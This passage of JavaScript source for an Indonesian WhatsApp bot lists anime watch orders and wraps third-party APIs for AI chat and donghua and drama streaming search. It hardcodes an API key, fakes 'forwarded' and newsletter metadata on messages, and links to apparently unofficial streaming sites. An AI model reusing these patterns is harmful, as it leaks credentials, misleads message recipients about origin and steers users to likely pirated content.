			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "gintama") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Gintama ࿐໋*

- Gintama (S1, 201 Eps)
- Gintama: Gekijouban Shinyaku Benizakura-Hen
- Gintama' (S2, 50 Eps)
- Gintama': Futon ni Haitte kara Buki Nokoshi ni Kizuite Neru ni Nerenai Toki mo Aru 
- Gintama' Enchousen (S3, 13 Eps)
- Gintama: Gekijoban Gintama Kanketsu-hen : Yorozuya yo Eien Nare
- Gintama°: Umai-mono wa Atomawashi ni Suru to Yokodorisareru kara Yappari Saki ni Kue
- Gintama° (2015, S4, 51 Eps)
- Gintama°: Aizome Kaori-Hen (OVA, 2 Eps)
- Gintama. (S5, 12 Eps)
- Gintama: Monster Strike Hen
- Gintama: Porori Hen (S6, 13 Eps)
- Gintama: Shirogane no Tamashii-hen (S7, 12 Eps)
- Gintama: Shirogane no Tamashii-hen : Kouhan-sen (S7 Part 2, 14 Eps)
- Gintama the Semi-Final (Spesial, 2 Eps)
- Gintama: The Finale`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "kaguya-sama") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Kaguya-sama ࿐*

- Kaguya-sama wa Kokurasetai: Tensai-tachi no Renai Zunousen
- Kaguya-sama wa Kokurasetai? Tensai-tachi no Renai Zunousen
- Kaguya-sama wa Kokurasetai: Tensai-tachi no Renai Zunousen OVA
- Kaguya-sama wa Kokurasetai: Tensai-tachi no Renai Zunousen 3`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "haikyuu!!") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Haikyuu!! ࿐໋*

- Haikyuu!! Season 1
- Haikyuu!!: Lev Genzan
- Haikyuu!! Movie 1: Owari to Hajimari
- Haikyuu!! Movie 2: Shousha to Haisha
- Haikyuu!!: Karasuno Koukou vs. Shiratorizawa Gakuen Koukou Season 3
- Haikyuu!!: Riku vs. Kuu
- Haikyuu!! Movie 3: Sainou to Sense
- Haikyuu Movie 4: Concept no Tatakai
- Haikyuu!!: Tokushuu! Haru-kou Volley ni Kaketa Seishun
- Haikyuu!!: vs. "Akaten"
- Haikyuu!!: To the Top
- Haikyuu!! Season 5: To the Top Part 2nd Season`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "mushishi") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Mushishi ࿐໋*

- Mushishi
- Mushishi: Hihamukage
- Mushishi Zoku Shou
- Mushishi: Odoro no Michi
- Mushishi Zoku Shou 2nd season
- Mushishi: Suzu no Shizuku`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "barserk") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Berserk ࿐໋*

- Kenpuu Denki Berserk
- Berserk: Ougon Jidai-hen I - Haou no Tamago
- Berserk: Ougon Jidai-hen II - Doldrey Kourayku
- Berserk: Ougon Jidai-hen III -  Kourin
- Berserk
- Berserk 2nd Season
- Berserk Recap
 -Berserk: Majo no Tsuisou`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "bleach") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Bleach ࿐໋*

*「 Rekomendasi: 」*
- Arc Agen Shinigami Eps 1-20
- Arc Menyelinap ke Soul Society Eps 21-32 & 34-41
- Arc Penyelamatan di Soul Society Eps 42-49 & 51-63
*- Bleach Movie 1: Memories of Nobody*
- Arc Kedatangan Arrancar Eps 110-127
- Arc Menyelinap ke Hueco Mundo Eps 138-146
- Arc Pertarungan Sengit Melawan Arrancar Eps 150-167
*- Bleach Movie 2: The Diamond Dust Rebellion - Mou Hitotsu no Hyourinmaru*
- Arc Arrancar Melawan Shinigami Eps 190-203
*- Bleach Movie 3: Fade to Black - Kimi no Na wo Yobu*
- Arc Masa Lalu Eps 206-212
- Arc Pertempuran Penentu Karakura Eps 215-226
- Arc Kehancuran Arrancar Eps 266-286
& 288-297
*- Bleach Movie 4: Jigoku-hen*
- Arc Kehancuran Arrancar Eps 300-302 & 306-310
- Arc Shinigami Pengganti yang Hilang Eps 343-354 & 356-366

*「 Full Series: 」*
- Arc Agen Shinigami Eps 1-20
*- Bleach: Memories in the Rain*
- Arc Menyelinap ke Soul Society Eps 21-32
- Pahlawan Baru Misterius Eps 33 (Filler)
- Arc Menyelinap ke Soul Society Eps 34-41
- Arc Penyelamatan di Soul Society Eps 42-49
- Menghidupkan kembali Singa Eps 50 (Filler)
- Arc Penyelamatan di Soul Society Eps 51-63
*- Bleach: The Sealed Sword Frenzy*
- Arc Bount Eps 64-109 (Filler)
*- Bleach Movie 1: Memories of Nobody*
- Arc Kedatangan Arrancar Eps 110-127
- Arc Hogyoku Dicuri Eps 128-137 (Filler)
- Arc Menyelinap ke Hueco Mundo Eps 138-146
- Sub Arc Hutan Menos Episode 147-149 (Filler)
- Arc Pertarungan Sengit Melawan Arrancar Eps 150-167
*- Bleach Movie 2: The Diamond Dust Rebellion - Mou Hitotsu no Hyourinmaru*
- Arc Menghentikan Kapten Shuusuke Eps 168-189 (Filler)
- Arc Arrancar Melawan Shinigami Eps 190-203
*- Bleach Movie 3: Fade to Black - Kimi no Na wo Yobu*
- Strategi Persuasi Ichigo Eps 204 (Filler)
- Turnamen dengan Cekungan Eps 205 (Filler)
- Arc Masa Lalu Eps 206-212
- Mini-Arc Karakuraizer Eps 213-214 (Filler)
- Arc Pertempuran Penentu Karakura Eps 215-226
- Kesalahan Indah Eps 227 (Filler)
- Musim Panas! Festival Baju Renang!! Eps 228 (Filler)
- Jeritan Jiwa? Karpet Shinigami Lahir! Eps 229 (Filler)
- Zanpakutou Unknown Tales Arc Eps 230-265 (Filler)
- Arc Kehancuran Arrancar Eps 266-286
- Ichigo dan Lampu Ajaib Eps 287 (Filler)
- Arc Kehancuran Arrancar Eps 288-297
- Film Festival Shinigami! Eps 298 (Filler)
- The Hell Verse: Prolog Eps 299 (Filler)
*- Bleach Movie 4: Jigoku-hen*
- Arc Kehancuran Arrancar Eps 300-302
- Dunia Nyata dan Shinigami! Tahun Baru Spesial! Eps 303 (Filler)
- Sisi Lain Cerita! Musuh Monster!? Eps 304 (Filler)
- Hisagi, Menuju Onsen! Eps 305 (Filler)
- Arc Kehancuran Arrancar Eps 306-310
- Pengisi Miscellaneous Eps 311-316 (Filler)
- Arc Gotei 13 Eps 317-342 (Filler)
- Arc Shinigami Pengganti yang Hilang Eps 343-354
- Tahun baru di Seireitei Khusus! Eps 355 (Filler)
- Arc Shinigami Pengganti yang Hilang Eps 356-366

*Note:* Filler adalah Episode yang dapat dilewati karena biasanya memiliki sedikit pengaruh pada plot utama dan karakter cerita.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "magi") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `Watch order Magi ࿐໋*

_Urutan Anime Magi dari Rilis :_
Magi: The Labyrinth Of Magic (Season 1)
Magi: The Kingdom Of Magic (Season 2)
Magi: Sinbad no Bouken (OVA)
Magi: Sinbad no Bouken (Season 3)

_Urutan Anime Magi dari Cerita :_
Magi: Sinbad no Bouken (OVA)
Magi: Sinbad no Bouken (Season 3)
Magi: The Labyrinth Of Magic (Season 1)
Magi: The Kingdom Of Magic (Season 2)`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "gundam") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Urutan Gundam Universal Century (UC) ࿐໋*

• Mobile Suit Gundam The Origin (UC 0068) (Secara kronologi Origin lebih dulu dari Gundam 0079 tapi disarankan ditonton setelah Mobile Suit Gundam: Char’s Counterattack )
• Mobile Suit Gundam (UC 0079)
• Mobile Suit Gundam: The 08th MS Team (UC 0079)
• Mobile Suit Gundam War in The Pocket (UC 0079)
• Mobile Suit Gundam IGLOO (UC 0079)
• Mobile Suit Gundam Thunderbolt (UC 0079)
• Mobile Suit Gundam 0083: Stardust Memory (UC 0083)
• Mobile Suit Zeta Gundam (UC 0087)
• Mobile Suit Gundam ZZ (UC 0088)
• Mobile Suit Gundam: Char’s Counterattack (UC 0093)
• Mobile Suit Gundam Unicorn (UC 0096)
• Mobile Suit Gundam Narrative (UC 0097)
• Mobile Suit Gundam Hathaway (UC 0105)
• Mobile Suit Gundam F91 (UC 0123)
• Mobile Suit Victory Gundam (UC 0153)
• G-Savior(ini live action, ga usah ditonton kalo anda sayang dengan mata anda (UC 0223) 

Future Century
• Mobile Fighter G Gundam 

After Colony
• Gundam Wing
• Gundam Wing: Endless Waltz 

After War
• Gundam X 

Correct Century
• Turn A Gundam 

Cosmic Era
• Gundam Seed
• Gundam Seed Destiny 

Anno Domini
• Gundam 00 

Advanced Generation
• Gundam AGE 

Regild Century
• G no Reqonquista (jangan ditonton kalo gamau kena tumor otaķ) 

Post Disaster
• Gundam Iron Blooded Orphan 

Spin off (Our Universe)
• Gundam Build Fighter
• Gundam Build Fighter Try
• Gundam Build Divers
• Gundam Build Divers Re Rise`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "naruto") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Naruto ࿐໋*

「 Full Series: 」
*【 Season 1 】*
- Prologue - Land of Waves Arc: Episode 1-19
- Chunin Exams Arc: Episode 20-67

*【 Season 2 】*
- Konoha Crush Arc: Episode 68-80
- Search for Tsunade Arc: Episode 81-100
- *Naruto The Movie: Clash in The Land of Snow*

*【 Season 3 】*
- Land of Tea Escort Mission Arc: Episode 101-106 (Filler)
- Sasuke Recovery Mission Arc: Episode 107-135
- Land of Rice Fields Investigation Mission Arc: Episode 136-140 (Filler)
- Eps 141 & 142 Mixed Canon/Filler
- *Naruto The Movie: Legend of The Stone of Gelel*

*【 Season 4 】*
- Mizuki Tracking Mission Arc: 142-147 (Filler)
- Bikochu Search Mission Arc: Episode 148-151 (Filler)
- Kurosuki Family Removal Mission Arc: 152-158 (Filler)
- Gosunkugi Capture Mission Arc: Episode 159-161 (Filler)
- Cursed Warrior Extermination Mission Arc: Episode 162-168 (Filler)
- Kaima Capture Mission Arc: Episode 169-174 (Filler)
- Buried Gold Excavation Mission Arc: Episode 175-177 (Filler)
- Star Guard Mission Arc: Episode 178-183 (Filler)

*【 Season 5 】*
- Sasuke Recovery Mission Arc: Episode 184-186 (Filler)
- Peddlers Escort Mission Arc: Episode 187-194 (Filler)
- *Naruto The Movie: Guardian of The Crescent Moon Kingdom*
- Third Great Beast Arc: Episode 195-196 (Filler)
- Konoha Plans Recapture Mission Arc: Episode 197-202 (Filler)
- Yakumo Kurama Rescue Mission Arc: Episode 203-208 (Filler)
- Gantetsu Escort Mission Arc: Episode 209-212 (Filler)
- Menma Memory Search Mission Arc: Episode 213-215 (Filler)
- Sunagakure Support Mission: Episode 216-219 (Filler)
- Departure Eps 220 Mixed Canon/Filler

*Note:* Filler adalah Episode yang dapat dilewati karena biasanya memiliki sedikit pengaruh pada plot utama dan karakter cerita.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "digimon") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Anime Digimon ࿐໋*

「 Berdasarkan Tanggal Rilis: 」
- Digimon Adventure
- Digimon Adventure 02
- Digimon Tamers
- Digimon Frontier
- Digimon Data Squad
- Digimon Fusion
- Digimon Adventure Tri
- Digimon Universe: App Monsters
- Digimon Ghost Game

「 Full Series/Sesuai Series: 」
*【 Season 1 】*
- Digimon Adventure 
- *Digimon Adventure Movie 1*
- *Digimon Adventure: Our War Game*

*【 Season 2 】*
- Digimon Adventure 02
- *Digimon Adventure 02 Movie: Digimon Hurricane Touchdown*
- *Digimon Adventure 02 Movie: Revenge of Diaboromon*

*【 Season 3 】*
- Digimon Tamers
- *Digimon Tamers Movie: The Adventures Battle*
- *Digimon Tamers Movie: Digimon Runaway Express*

*【 Season 4 】*
- Digimon Frontier
- *Digimon Frontier Movie: Revival of the Ancient Digimon!*

*【 Season 5 】*
- Digimon Savers
- *Digital Monster X-Evolution*
- *Digimon Savers Movie: Ultimate Power! Activate Burst Mode*

*【 Season 6 】*
- Digimon Xros Wars

*【 Season 7 】*
- Digimon Xros Wars: The Young Hunters Who Leapt Through Time

*【 Season 8 】*
- Digimon Adventure Tri
- *Digimon Adventure Tri Movie: Saikai*
- *Digimon Adventure Tri Movie: Ketsui*
- *Digimon Adventure Tri Movie: Kokuhaku*
- *Digimon Adventure Tri Movie: Soushitsu*
- *Digimon Adventure Tri Movie: Kyousei*
- *Digimon Adventure Tri Movie: Bokura no Mirai*

*【 Season 9 】*
- Digimon Universe: Appli Monster

*【 Season 10 】*
- Digimon Adventure (2020)

「 Another Movie: 」
- Digimon Adventure 3D: Digimon Grand Prix
- Digimon Savers 3D: The Digital World in Imminent Danger!`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "grisaia") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Grisaia ࿐໋*

*「 Berdasarkan Alur: 」*
- Season 1: Grisaia no Kajitsu
- Grisaia no Kajitsu Specials
- Grisaia no Meikyuu: Caprice no Mayu 0
- Season 2: Grisaia no Rakuen
- Grisaia no Meikyuu: Caprice no Mayu 0 – Takizono Basketball Club no Nama Cream Party!
- Grisaia no Rakuen Specials
- *Grisaia: Phantom Trigger The Animation*
- *Grisaia: Phantom Trigger The Animation – Stargazer*

*「 Berdasarkan Tahun Rilis: 」*
_TV Series_
- Grisaia no Kajitsu (2014)
- Grisaia no Rakuen (2015)
_Specials_
- Grisaia no Kajitsu Specials (2014)
- Grisaia no Meikyuu: Caprice no Mayu 0 (2015)
- Grisaia no Meikyuu: Caprice no Mayu 0 - Takizono Basketball Club no Nama Cream Party! (2015)
- Grisaia no Rakuen Specials (2015)
_Movies_
- Grisaia: Phantom Trigger the Animation (2019)
- Grisaia: Phantom Trigger the Animation - Stargazer (2020)`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "kingdom") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Kingdom ࿐໋*

- Kingdom Season 1
- Kingdom Season 2
- Kingdom Season 3
- Kingdom Season 4 (2024)`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "meitantei conan") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Meitantei Conan*

- Eps 1-54
- *Meitantei Conan Movie 01: Tokei Jikake no Matenrou*
- Eps 55-97
- *Meitantei Conan Movie 02: Jyuuyonbanme no Target*
- Eps 98-140
- *Meitantei Conan Movie 03: Seikimatsu no Majutsushi*
- Eps 141-173
- _Meitantei Conan OVA 01: Conan VS KID VS YAIBA_
- Eps 174-186
- *Meitantei Conan Movie 04: Hitomi no Naka no Ansatsusha*
- Eps 187-231
- *Meitantei Conan Movie 05: Tengoku e no Count Down*
- Eps 232-262
- _Meitantei Conan OVA 02: 16 Nin no Yougisha_
- Eps 263-275
- *Meitantei Conan Movie 06: Baker Street no Bourei*
- Eps 276-303
- _Meitantei Conan OVA 03: Conan to Heiji to Kieta Shounen_
- Eps 304-315
- *Meitantei Conan Movie 07: Meikyuu no Crossroad*
- Eps 316-344
- _Meitantei Conan OVA 04: Conan to Kid to Crystal Mother_
- Eps 345-356
- *Meitantei Conan Movie 08: Ginyoku no Magician*
- Eps 357-383
- _Meitantei Conan OVA 05: Hyouteki wa Kogoro! Shounen Tanteidan Maruchichousa_
- Eps 384-396
- *Meitantei Conan Movie 09: Suihei Senjou no Strategy*
- Eps 397-424
- _Meitantei Conan OVA 06: Kieta Daiya wo Oe! Conan & Heiji VS Kid!_
- Eps 425-434
- *Meitantei Conan Movie 10: Tantei-tachi no Requiem*
- Eps 435-452
- 
- Eps 453-459
- _Meitantei Conan OVA 07: Agasa-sensei no Chousenjou! Agasa vs Conan & Shounen Tanteidan_

*Segini dulu ya gan*

*Tebal* = Movie
_Miring_ = Ova`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "waduh") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `tekspanjang`,
			},
			{ quoted: m },
		);
	}
};
break
                    case 'rias-ai': {
	if (!text) return newReply(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://api.junn4.my.id/ai/chatGPT?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Rias AI Made By Toxxic Tech\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '> Queen Rias'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync(global.THUMBNAIL)}, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Thanks Mrs Rias\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
case 'donghua': {   
    if (!text) return newReply(`Example : ${prefix + command} Soul Land`);      
    try {        
        let res = await fetch(`https://api.alyachan.dev/api/donghua?q=${text}&apikey=yC8nWs`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 10).map(donghua => {
                // Mengubah URL di sini
                let updatedUrl = donghua.url.replace('https://tv1.ichinime.net', 'https://tv1.ichinime.net');
                return {
                    title: donghua.title,
                    rows: [
                        {
                            title: 'SEE DETAILS',
                            description: `click to see detail "${donghua.title}"`,
                            id: `.detaildonghua ${updatedUrl}`
                        },
                        {
                            title: 'WATCH NOW',
                            description: `click to watch "${donghua.title}"`,
                            id: `.streamingdonghua ${updatedUrl}`
                        }
                    ]
                };
            });

            let listMessage = {
                title: 'TAP HERE',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363336528578108@newsletter',
                                    newsletterName: 'DONGHUA RESULT',
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
                                forwardingScore: 256,
                                externalAdreplygcLorenzo: {
                                    title: 'ToxxicTechInc',
                                    thumbnailUrl: json.data[0].thumbnail, // gunakan thumbnail dari film pertama
                                    sourceUrl: json.data[0].url.replace('https://tv1.ichinime.net', 'https://tv1.ichinime.net'), // gunakan URL dari film pertama
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Your search was successful! Select a search result from the menu below`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Hasil_Pencarian",
                                hasMediaAttachment: false//,
                                //...(await prepareWAMessageMedia({ image: { url: json.data[0].thumbnail } }, { upload: ToxxicTechInc.waUploadToServer }))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            newReply('Donghua not found');
        }
    } catch (error) {
        console.error(error);
        newReply('error');
    }
 }
break
case 'detaildonghua': {
if (!/https?:\/\/(www\.)?tv1.ichinime\.net/i.test(args[0])) return newReply(`Example : ${prefix + command} url`)
try {
let res = await fetchJson(`https://api.alyachan.dev/api/donghua-get?url=${args[0]}&type=detail&apikey=yC8nWs`)
if (res.status && res.data) {
let hasil = res.data
let teks = `
Title: *${hasil.title}*

Type: ${hasil.type}
Release Date: ${hasil.release}
Genre: ${hasil.genre}
Duration: ${hasil.duration}
Studio: ${hasil.studio}
Season: ${hasil.season}

Description: ${hasil.sinopsis}`
await ToxxicTechInc.sendMessage(m.chat, {
text: teks,
contextInfo: {
mentionedJid: [m.sender],
externalAdreplygcLorenzo: {
title: "Donghua-Detail",
thumbnailUrl: hasil.thumbnail,
sourceUrl: `${text}`,
mediaType: 1,
renderLargerThumbnail: true
}}
},{
quoted: m
})
}
console.log(res)
} catch (err) {
console.log(err)
newReply('error')
}
}
break
case 'streamingdonghua': {
    if (!text) return newReply(`Example : ${prefix + command} url`);
    try {
        let res = await fetch(`https://api.alyachan.dev/api/donghua-get?url=${args[0]}&type=detail&apikey=yC8nWs`);
        let result = await res.json();
        if (result.status && result.data && result.data.episodes.length > 0) {
            let episodes = result.data.episodes;

            let episodeButtons = episodes.map((episode) => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Streaming Episode ${episode.episode} (${episode.title})`,
                    url: episode.url,
                    merchant_url: episode.url
                })
            }));

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363336528578108@newsletter',
                                    newsletterName: 'Donghua search result',
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Here are your donghua streaming results. Select the episode you want to watch:'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Hello *@${m.sender.split('@')[0]}* 👋`,
                                subtitle: "ToxxicTechInc",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: episodeButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            newReply('No episode found');
        }
    } catch (err) {
        console.log(err);
        newReply('error');
    }
}
break
case 'drakor': {   
    if (!text) return newReply(`Example : ${prefix + command} Train to busan`);      
    try {
        let res = await fetch(`https://api.neoxr.eu/api/drakor?q=${text}&apikey=yC8nWs`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 10).map(drakor => {
                // Mengubah URL di sini
                let updatedUrl = drakor.url.replace('https://drakorasia.lol', 'https://drakorasia.us');
                return {
                    title: drakor.title,
                    rows: [
                        {
                            title: 'SEE DETAILS',
                            description: `click to see detail "${drakor.title}"`,
                            id: `.detaildrakor ${updatedUrl}`
                        },
                        {
                            title: 'WATCH NOW',
                            description: `click to watch "${drakor.title}"`,
                            id: `.streamingdrakor ${updatedUrl}`
                        }
                    ]
                };
            });

            let listMessage = {
                title: 'TAP HERE',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363336528578108@newsletter',
                                    newsletterName: 'DRAKOR RESULT',
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
                                forwardingScore: 256,
                                externalAdreplygcLorenzo: {
                                    title: 'ToxxicTechInc',
                                    thumbnailUrl: json.data[0].thumbnail, // gunakan thumbnail dari film pertama
                                    sourceUrl: json.data[0].url.replace('https://drakorasia.lol', 'https://drakorasia.us'), // gunakan URL dari film pertama
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Your search was successful! Select a search result from the menu below`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Hasil_Pencarian",
                                hasMediaAttachment: false//,
                                //...(await prepareWAMessageMedia({ image: { url: json.data[0].thumbnail } }, { upload: ToxxicTechInc.waUploadToServer }))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            newReply('Drakor not found');
        }
    } catch (error) {
        console.error(error);
        newReply('error');
    }
 }
break
case 'detaildrakor': {
if (!/https?:\/\/(www\.)?drakorasia\.us/i.test(args[0])) return newReply(`Example : ${prefix + command} url`)
try {
let res = await fetchJson(`https://api.neoxr.eu/api/drakor-get?url=${args[0]}&apikey=yC8nWs`)
if (res.status && res.data) {
let hasil = res.data
let teks = `
*${hasil.title}*

${hasil.sinopsis}


Total Episode: ${hasil.episode}
Release Date: ${hasil.release}
Genre: ${hasil.genre[0]}
Duration: ${hasil.duration}
Publisher: ${hasil.channel}
Actor: ${hasil.cast}`
await ToxxicTechInc.sendMessage(m.chat, {
text: teks,
contextInfo: {
mentionedJid: [m.sender],
externalAdreplygcLorenzo: {
title: "Drakor-Detail",
thumbnailUrl: hasil.thumbnail,
sourceUrl: `${text}`,
mediaType: 1,
renderLargerThumbnail: true
}}
},{
quoted: m
})
}
console.log(res)
} catch (err) {
console.log(err)
newReply('error')
}
}
break
case 'streamingdrakor': {
    if (!text) return newReply(`Example : ${prefix + command} url`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/drakor-get?url=${text}&apikey=yC8nWs`);
        let result = await res.json();
        if (result.status && result.data && result.data.episodes.length > 0) {
            let episodes = result.data.episodes;
            
            let episodeButtons = episodes.flatMap((episode) => {
                return episode.urls.map(url => ({
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
